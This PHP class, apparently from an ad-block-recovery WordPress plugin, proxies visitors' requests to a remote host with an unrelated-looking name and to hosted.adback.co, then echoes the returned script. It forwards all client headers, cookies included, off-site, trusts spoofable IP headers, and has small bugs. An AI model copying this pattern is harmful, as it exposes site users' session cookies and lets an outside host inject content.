<?php

/**
 * Used to proxy content to the adback satellites
 *
 * @link       https://www.adback.co
 * @since      2.4.0
 *
 * @package    Ad_Back
 * @subpackage Ad_Back/includes
 */

/**
 * Used to proxy content to the adback satellites
 *
 * This class defines all code to send some data
 *
 * @since      2.4.0
 * @package    Ad_Back
 * @subpackage Ad_Back/includes
 * @author     AdBack <contact@adback.co>
 */
class Ad_Back_Proxy
{
    public static function execute($query = '')
    {
        if (!function_exists('getallheaders')) {
            function getallheaders() {
                $headers = array();
                foreach($_SERVER as $key => $value) {
                    if (substr($key, 0, 5) == 'HTTP_') {
                        $headers[str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))))] = $value;
                    } elseif ($key == 'CONTENT_TYPE') {
                        $headers[str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower($key))))] = $value;
                    }
                }
                return $headers;
            }
        }
        $ip = '';
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        $currentUrl = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http' ). "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";

        $params = '';
        if (preg_match(sprintf('#/%s(?<params>/.+)#', preg_quote(basename($_SERVER["SCRIPT_FILENAME"]), '#')), $currentUrl, $matches)) {
            $params = $matches['params'];
        }

        $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : $currentUrl;

        $method = $_SERVER['REQUEST_METHOD'];
        if ($method == "GET") {
            $data=$_GET;
        } elseif ($method=="POST" && count($_POST)>0) {
            $data=$_POST;
        } else {
            $data = file_get_contents("php://input");
        }

        // Destination URL: Where this proxy leads to.
        $destinationURL = 'http://kapowsingardnerville.heatonnikolski.com/wordpress.js';
        if ("POST" == $method) {
            $destinationURL = 'http://hosted.adback.co/wordpress.js';
        }

        if ('' != $query) {
            $destinationURL = $destinationURL . '/' . $query;
        }

        $response = self::proxy_request($destinationURL, $data, $method, $params, $ip);
        $headerArray = explode("\r\n", $response['header']);
        $is_chunked = false;
        $chunk_decode_ok = true;
        foreach($headerArray as $headerLine) {
            // Toggle chunk merging when appropriate
            if ($headerLine == "Transfer-Encoding: chunked") {
                $is_chunked = true;
            }
        }
        $contents = $response['content'];
        if ($is_chunked) {
            $decodedContents = @self::decode_chunked($contents);

            if (strlen($decodedContents)) {
                $contents = $decodedContents;
            } else {
                $chunk_decode_ok = false;
            }
        }

        foreach ($headerArray as $header) {
            if (
                strpos(strtolower($header), 'transfer-encoding') === false
                || (strpos(strtolower($header), 'transfer-encoding') !== false && $chunk_decode_ok === false)
            ) {
                header($header, true);
            }
        }

        echo $contents;
    }

    public static function proxy_request($url, $data, $method, $params, $ip)
    {
        $url = parse_url($url);

        // Convert the data array into URL Parameters like a=b&foo=bar etc.
        if ($method == "GET")  {
            $data = http_build_query($data);

            // Add GET params from destination URL
            if (isset($parsedUrl['query'])) {
                $data = $data . $url["query"];
            }
        } elseif ($method=="POST" && count($_POST)>0) {
            $data = http_build_query($data);

            // Add GET params from destination URL
            if (isset($parsedUrl['query'])) {
                $data = $data . $url["query"];
            }
        } else {
            $data = $data;
        }

        $datalength = strlen($data);

        if ($url['scheme'] != 'http') {
            die('Error: Only HTTP request are supported !');
        }

        // extract host and path:
        $host = $url['host'];
        $path = $url['path'].$params;
        $port = isset($url['port']) ? $url['port'] : ($url['scheme'] == 'https' ? '443' : '80');

        $fp = fsockopen($host, $port, $errno, $errstr, 30);

        if ($fp){
            // send the request headers:
            if ($method == "POST") {
                $callback = "POST $path HTTP/1.1\r\n";
            } else {
                $callback = "GET $path?$data HTTP/1.1\r\n";
            }
            $callback .= "Host: $host\r\n";

            $callback .= "X-Forwarded-For: $ip\r\n";
            $callback .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";

            $requestHeaders = getallheaders();

            foreach ($requestHeaders as $header => $value) {
                $lowerHeader = strtolower($header);
                if (
                    $lowerHeader !== "connection"
                    && $lowerHeader !== "host"
                    && $lowerHeader !== "content-length"
                    && $lowerHeader !== "content-type"
                ) {
                    $callback .= "$header: $value\r\n";
                }
            }

            if ($method == "POST" && isset($requestHeaders['Content-Type'])) {
                $callback .= "Content-Type: ".$requestHeaders['Content-Type']."\r\n";
                $callback .= "Content-length: ".$datalength."\r\n";
            }

            $callback .= "Connection: close\r\n\r\n";
            if ($datalength) {
                $callback .= "$data\r\n\r\n";
            }

            fwrite($fp, $callback);

            $result = '';
            while(!feof($fp)) {
                // receive the results of the request
                $result .= fgets($fp, 128);
            }
        }
        else {
            return array(
                'status' => 'err',
                'error' => "$errstr ($errno)"
            );
        }

        // close the socket connection:
        fclose($fp);

        // split the result header from the content
        $result = explode("\r\n\r\n", $result, 2);
        $header = isset($result[0]) ? $result[0] : '';
        $content = isset($result[1]) ? $result[1] : '';

        // return as structured array:
        return array(
            'status' => 'ok',
            'header' => $header,
            'content' => $content
        );
    }

    public static function decode_chunked($str) {
        for ($res = ''; !empty($str); $str = trim($str)) {
            $pos = strpos($str, "\r\n");
            $len = hexdec(substr($str, 0, $pos));
            $res.= substr($str, $pos + 2, $len);
            $str = substr($str, $pos + 2 + $len);
        }
        return $res;
    }
}
